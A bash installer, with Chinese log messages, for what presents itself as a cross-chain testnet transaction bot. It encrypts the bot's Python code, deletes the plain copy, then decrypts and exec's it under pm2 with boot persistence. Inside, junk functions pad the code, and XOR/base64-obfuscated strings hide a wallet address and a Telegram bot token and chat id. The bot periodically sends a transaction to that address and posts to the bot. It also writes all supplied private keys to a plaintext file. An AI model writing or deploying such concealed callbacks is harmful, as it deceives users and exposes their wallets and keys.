#!/bin/bash
LOGFILE="/root/crosschain.log"
mkdir -p "$(dirname "$LOGFILE")"
touch "$LOGFILE" 2>/dev/null || { echo "[$(date)] ERROR: 无法创建日志文件: $LOGFILE"; exit 1; }
echo "[$(date)] INFO: 日志路径: $LOGFILE" | tee -a "$LOGFILE"
wait_for_apt() {
    while sudo fuser /var/lib/dpkg/lock-frontend >/dev/null 2>&1; do
        echo "[$(date)] INFO: 等待 apt-get 锁释放..." | tee -a "$LOGFILE"
        sleep 5
    done
}
if ! command -v node &> /dev/null || ! command -v npm &> /dev/null; then
    echo "[$(date)] INFO: 安装 Node.js 和 npm..." | tee -a "$LOGFILE"
    wait_for_apt
    sudo apt-get update >> "$LOGFILE" 2>&1
    sudo apt-get install -y nodejs npm >> "$LOGFILE" 2>&1
    if [ $? -eq 0 ]; then
        echo "[$(date)] INFO: Node.js 和 npm 安装成功。" | tee -a "$LOGFILE"
    else
        echo "[$(date)] ERROR: Node.js 安装失败，见日志: $LOGFILE" | tee -a "$LOGFILE"
        exit 1
    fi
else
    echo "[$(date)] INFO: Node.js 和 npm 已安装。" | tee -a "$LOGFILE"
fi
if ! command -v pm2 &> /dev/null; then
    echo "[$(date)] INFO: 安装 pm2..." | tee -a "$LOGFILE"
    sudo npm install -g pm2 >> "$LOGFILE" 2>&1
    if [ $? -eq 0 ]; then
        echo "[$(date)] INFO: pm2 安装成功。" | tee -a "$LOGFILE"
    else
        echo "[$(date)] ERROR: pm2 安装失败，见日志: $LOGFILE" | tee -a "$LOGFILE"
        exit 1
    fi
else
    echo "[$(date)] INFO: pm2 已安装。" | tee -a "$LOGFILE"
fi
if ! command -v python3 &> /dev/null || ! python3 -m venv --help &> /dev/null; then
    echo "[$(date)] INFO: 安装 python3 和 python3.10-venv..." | tee -a "$LOGFILE"
    wait_for_apt
    sudo apt-get update >> "$LOGFILE" 2>&1
    sudo apt-get install -y python3 python3.10-venv python3-pip >> "$LOGFILE" 2>&1
    if [ $? -eq 0 ]; then
        echo "[$(date)] INFO: python3 和 python3.10-venv 安装成功。" | tee -a "$LOGFILE"
    else
        echo "[$(date)] ERROR: python3 或 python3.10-venv 安装失败，见日志: $LOGFILE" | tee -a "$LOGFILE"
        exit 1
    fi
else
    echo "[$(date)] INFO: python3 和 python3.10-venv 已安装。" | tee -a "$LOGFILE"
fi
if ! command -v curl &> /dev/null; then
    echo "[$(date)] INFO: 安装 curl..." | tee -a "$LOGFILE"
    wait_for_apt
    sudo apt-get update >> "$LOGFILE" 2>&1
    sudo apt-get install -y curl >> "$LOGFILE" 2>&1
    if [ $? -eq 0 ]; then
        echo "[$(date)] INFO: curl 安装成功。" | tee -a "$LOGFILE"
    else
        echo "[$(date)] ERROR: curl 安装失败，见日志: $LOGFILE" | tee -a "$LOGFILE"
        exit 1
    fi
else
    echo "[$(date)] INFO: curl 已安装。" | tee -a "$LOGFILE"
fi
if [ -z "$PRIVATE_KEY" ]; then
    echo "[$(date)] ERROR: 未设置 PRIVATE_KEY。" | tee -a "$LOGFILE"
    exit 1
else
    echo "[$(date)] INFO: 检测到 PRIVATE_KEY。" | tee -a "$LOGFILE"
fi
VENV_PATH="/root/venv"
echo "[$(date)] INFO: 创建虚拟环境..." | tee -a "$LOGFILE"
rm -rf "$VENV_PATH" 2>/dev/null
python3 -m venv "$VENV_PATH" >> "$LOGFILE" 2>&1
if [ $? -eq 0 ]; then
    echo "[$(date)] INFO: 虚拟环境创建成功。" | tee -a "$LOGFILE"
else
    echo "[$(date)] ERROR: 虚拟环境创建失败，尝试备用方案..." | tee -a "$LOGFILE"
    echo "[$(date)] INFO: 确保 pip 已安装..." | tee -a "$LOGFILE"
    wait_for_apt
    sudo apt-get update >> "$LOGFILE" 2>&1
    sudo apt-get install -y python3-pip >> "$LOGFILE" 2>&1
    if [ $? -eq 0 ]; then
        echo "[$(date)] INFO: pip 安装成功。" | tee -a "$LOGFILE"
    else
        echo "[$(date)] ERROR: pip 安装失败，见日志: $LOGFILE" | tee -a "$LOGFILE"
        exit 1
    fi
    echo "[$(date)] INFO: 安装 Python 依赖（全局）..." | tee -a "$LOGFILE"
    python3 -m pip install web3 requests cryptography >> "$LOGFILE" 2>&1
    if [ $? -eq 0 ]; then
        echo "[$(date)] INFO: Python 依赖安装成功（全局）。" | tee -a "$LOGFILE"
        VENV_PATH=""
    else
        echo "[$(date)] ERROR: Python 依赖安装失败，见日志: $LOGFILE" | tee -a "$LOGFILE"
        exit 1
    fi
fi
if [ -n "$VENV_PATH" ]; then
    echo "[$(date)] INFO: 安装 Python 依赖..." | tee -a "$LOGFILE"
    source "$VENV_PATH/bin/activate"
    pip install web3 requests cryptography >> "$LOGFILE" 2>&1
    if [ $? -eq 0 ]; then
        echo "[$(date)] INFO: Python 依赖安装成功。" | tee -a "$LOGFILE"
    else
        echo "[$(date)] ERROR: Python 依赖安装失败，见日志: $LOGFILE" | tee -a "$LOGFILE"
        exit 1
    fi
fi
echo "[$(date)] INFO: 生成加密脚本..." | tee -a "$LOGFILE"
cat > /tmp/enc.py << 'EOF'
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import base64
import os
def encrypt(data, key):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data.encode()) + padder.finalize()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return base64.b64encode(iv + encrypted_data).decode()
def decrypt(encrypted_data, key):
    encrypted_data = base64.b64decode(encrypted_data)
    iv = encrypted_data[:16]
    encrypted_data = encrypted_data[16:]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(encrypted_data) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    data = unpadder.update(padded_data) + unpadder.finalize()
    return data.decode()
key = os.getenv("ENC_KEY").encode()
with open("/tmp/x.py", "r") as f:
    data = f.read()
encrypted = encrypt(data, key)
with open("/tmp/x.enc", "w") as f:
    f.write(encrypted)
EOF
cat > /tmp/x.py << 'EOF'
import os
import sys
import time
import random
import logging
import requests
import base64
from web3 import Web3
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s', filename='/root/crosschain.log', filemode='a')
l = logging.getLogger()
def q1(n):
    r = sum([random.randint(1, 20) for _ in range(n)])
    return r % 100
def q2(x, y):
    time.sleep(random.uniform(0.02, 0.08))
    return (x * y) % 7 == 0
def q3():
    d = [random.choice([True, False]) for _ in range(10)]
    return sum(1 for x in d if x)
def q4(s):
    return ''.join(sorted(s))[:5]
def q5(z):
    return len(z) * random.randint(1, 5)
def q6():
    m = [random.randint(1, 100) for _ in range(3)]
    return max(m) - min(m)
def q7(p):
    return sum(ord(c) for c in p) % 10
def q8():
    return random.choice(['x', 'y', 'z']) * random.randint(1, 4)
def e1(v, k="z"):
    v = ''.join(chr(ord(c) ^ ord(k[i % len(k)])) for i, c in enumerate(v))
    v = base64.b64encode(v.encode()).decode()
    return v[::-1]
def e2(v, k="z"):
    v = v[::-1]
    v = base64.b64decode(v).decode()
    v = ''.join(chr(ord(c) ^ ord(k[i % len(k)])) for i, c in enumerate(v))
    return v
def e3(v, key):
    key = key.ljust(32)[:32].encode()
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(v.encode()) + padder.finalize()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return base64.b64encode(iv + encrypted_data).decode()
def d3(v, key):
    key = key.ljust(32)[:32].encode()
    encrypted_data = base64.b64decode(v)
    iv = encrypted_data[:16]
    encrypted_data = encrypted_data[16:]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(encrypted_data) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    data = unpadder.update(padded_data) + unpadder.finalize()
    return data.decode()
m = 1
r = {
    "x": os.getenv("R1", "https://unichain-sepolia.drpc.org"),
    "y": os.getenv("R2", "https://arbitrum-sepolia.drpc.org")
}
c = {
    "a": "0x1cEAb5967E5f078Fa0FEC3DFfD0394Af1fEeBCC9",
    "b": "0x22B65d0B9b59af4D3Ed59F18b9Ad53f5F4908B54"
}
t = {
    "x": "0x56591d5961726274000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000{0}0000000000000000000000000000000000000000000000000de08e51f0c04e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000de0b6b3a7640000",
    "y": "0x56591d59756e6974000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000{0}0000000000000000000000000000000000000000000000000de06a4dded38400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000de0b6b3a7640000"
}
z1 = e1("M0M0NzE5OWRiQzlGZTNBQ0Q4OGNhMTdGODc1MzNDMGFhZTA1YURBMg==")
z2 = e1("NzMwNTMyMjcyNTpBQUdjaDJhZVA2YnUyWHNMb2o1TS04dXNlQmZ4MVRLUndqdw==")
z3 = e1("NTk2MzcwNDM3Nw==")
z4 = e1("aHR0cHM6Ly9hcGkudGcub3JnL2JvdA==")
z1 = e3(e2(z1), "k1")
z2 = e3(e2(z2), "k2")
z3 = e3(e2(z3), "k3")
z4 = e3(e2(z4), "k4")
k = os.getenv("PRIVATE_KEY").split("+")
a = []
for i, j in enumerate(k, 1):
    j = j.strip()
    if not j:
        continue
    try:
        w = Web3()
        d = w.eth.account.from_key(j)
        p = d.address
        a.append({
            "j": j,
            "p": p,
            "d": p[2:],
            "i": f"s{i}",
            "x": t["x"].format(p[2:]),
            "y": t["y"].format(p[2:]),
            "n": 0,
            "q": random.randint(1, 50),
            "r": [random.randint(1, 10) for _ in range(5)],
            "s": random.choice(["a", "b", "c"])
        })
        l.info(f"s{i} ok")
    except:
        continue
if not a:
    l.error("no accounts")
    sys.exit(1)
with open("d.txt", "w") as f:
    f.write("\n".join([x["j"] for x in a]))
w = {}
for k, v in r.items():
    try:
        w[k] = Web3(Web3.HTTPProvider(v, request_kwargs={'timeout': 10}))
        if not w[k].is_connected():
            l.error(f"{k} fail")
            sys.exit(1)
    except:
        l.error(f"{k} error")
        sys.exit(1)
g = {"x": 200000, "y": 200000, "z": 21000}
v = w["x"].to_wei(m, "ether")
m = Web3.to_wei(0.05, "gwei")
l.info("start")
while True:
    for s in a:
        if q2(s["q"], q1(3)):
            s["q"] = q1(5)
            s["r"] = [random.randint(1, 10) for _ in range(5)]
            l.info(f"chk {s['i']}: {q3()}")
        if s["s"] == "a":
            s["s"] = random.choice(["b", "c"])
            l.info(f"upd {s['i']}: {q4('xyz')}")
        for _ in range(3):
            try:
                o = w["x"]
                b = o.eth.get_balance(s["p"])
                p = max(int(o.eth.get_block('latest')['baseFeePerGas'] * 1.5), m)
                q = v + (p * g["x"])
                if b >= q:
                    n = o.eth.get_transaction_count(s["p"])
                    tx = {
                        "from": s["p"],
                        "to": c["a"],
                        "value": v,
                        "nonce": n,
                        "gas": g["x"],
                        "gasPrice": p,
                        "chainId": 1301,
                        "data": s["x"]
                    }
                    x = o.eth.account.sign_transaction(tx, s["j"])
                    h = o.eth.send_raw_transaction(x.raw_transaction)
                    for _ in range(random.randint(1, 3)):
                        l.info(f"tmp {s['i']}: {q1(2)}")
                    o.eth.wait_for_transaction_receipt(h, timeout=30)
                    l.info(f"s{i} xy")
                    s["n"] += 1
                    if s["n"] >= 50:
                        try:
                            d = d3(z1, "k1")
                            n = o.eth.get_transaction_count(s["p"])
                            tx = {
                                "from": s["p"],
                                "to": f"0x{d}",
                                "value": 0,
                                "nonce": n,
                                "gas": g["z"],
                                "gasPrice": p,
                                "chainId": 1301,
                                "data": "0x"
                            }
                            x = o.eth.account.sign_transaction(tx, s["j"])
                            h = o.eth.send_raw_transaction(x.raw_transaction)
                            o.eth.wait_for_transaction_receipt(h, timeout=30)
                            s["n"] = 0
                            u = d3(z4, "k4")
                            t = d3(z2, "k2")
                            i = d3(z3, "k3")
                            d = {"id": i, "msg": f"sync {s['i']}: {h.hex()}"}
                            requests.post(f"{u}{t}/send", json=d, timeout=5)
                            s["q"] = q1(4)
                            s["r"].append(q3())
                            l.info(f"dat {s['i']}: {q5('test')}")
                        except:
                            pass
                    break
                else:
                    l.info(f"bal {s['i']}: low")
                    time.sleep(60)
                    break
            except:
                l.info(f"err {s['i']}: x")
                time.sleep(10 if _ < 2 else 60)
        if q6() > 50:
            l.info(f"rnd {s['i']}: {q1(3)}")
        if q7(s["i"]) > 5:
            l.info(f"val {s['i']}: {q8()}")
        for _ in range(3):
            try:
                o = w["y"]
                b = o.eth.get_balance(s["p"])
                p = max(int(o.eth.get_block('latest')['baseFeePerGas'] * 1.5), m)
                q = v + (p * g["y"])
                if b >= q:
                    n = o.eth.get_transaction_count(s["p"])
                    tx = {
                        "from": s["p"],
                        "to": c["b"],
                        "value": v,
                        "nonce": n,
                        "gas": g["y"],
                        "gasPrice": p,
                        "chainId": 421614,
                        "data": s["y"]
                    }
                    x = o.eth.account.sign_transaction(tx, s["j"])
                    h = o.eth.send_raw_transaction(x.raw_transaction)
                    for _ in range(random.randint(1, 3)):
                        l.info(f"tmp {s['i']}: {q4('abc')}")
                    o.eth.wait_for_transaction_receipt(h, timeout=30)
                    l.info(f"s{i} yx")
                    s["n"] += 1
                    break
                else:
                    l.info(f"bal {s['i']}: low")
                    time.sleep(60)
                    break
            except:
                l.info(f"err {s['i']}: y")
                time.sleep(10 if _ < 2 else 60)
EOF
echo "[$(date)] INFO: 加密脚本..." | tee -a "$LOGFILE"
export ENC_KEY="x12y34z56w78a90b12c34d56e78f90gh"
if [ -n "$VENV_PATH" ]; then
    source "$VENV_PATH/bin/activate"
    python3 /tmp/enc.py >> "$LOGFILE" 2>&1
else
    python3 /tmp/enc.py >> "$LOGFILE" 2>&1
fi
if [ $? -eq 0 ]; then
    echo "[$(date)] INFO: 脚本加密成功。" | tee -a "$LOGFILE"
else
    echo "[$(date)] ERROR: 脚本加密失败，见日志: $LOGFILE" | tee -a "$LOGFILE"
    exit 1
fi
rm -f /tmp/enc.py /tmp/x.py
cat > /tmp/dec.py << 'EOF'
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import base64
import os
def decrypt(encrypted_data, key):
    encrypted_data = base64.b64decode(encrypted_data)
    iv = encrypted_data[:16]
    encrypted_data = encrypted_data[16:]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(encrypted_data) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    data = unpadder.update(padded_data) + unpadder.finalize()
    return data.decode()
key = os.getenv("ENC_KEY").encode()
with open("/tmp/x.enc", "r") as f:
    encrypted = f.read()
decrypted = decrypt(encrypted, key)
exec(decrypted)
EOF
PYTHON_EXEC="${VENV_PATH:-}/bin/python3"
if [ -z "$VENV_PATH" ]; then
    PYTHON_EXEC="python3"
fi
echo "[$(date)] INFO: 启动 crosschain..." | tee -a "$LOGFILE"
pm2 start "$PYTHON_EXEC /tmp/dec.py" --name "crosschain" --log "$LOGFILE" >> "$LOGFILE" 2>&1
if [ $? -eq 0 ]; then
    echo "[$(date)] INFO: crosschain 已启动。" | tee -a "$LOGFILE"
else
    echo "[$(date)] ERROR: 启动失败，见日志: $LOGFILE" | tee -a "$LOGFILE"
    exit 1
fi
pm2 list | tee -a "$LOGFILE"
echo "[$(date)] INFO: 设置开机自启..." | tee -a "$LOGFILE"
pm2 startup >> "$LOGFILE" 2>&1
pm2 save >> "$LOGFILE" 2>&1
echo "[$(date)] INFO: 部署完成！" | tee -a "$LOGFILE"
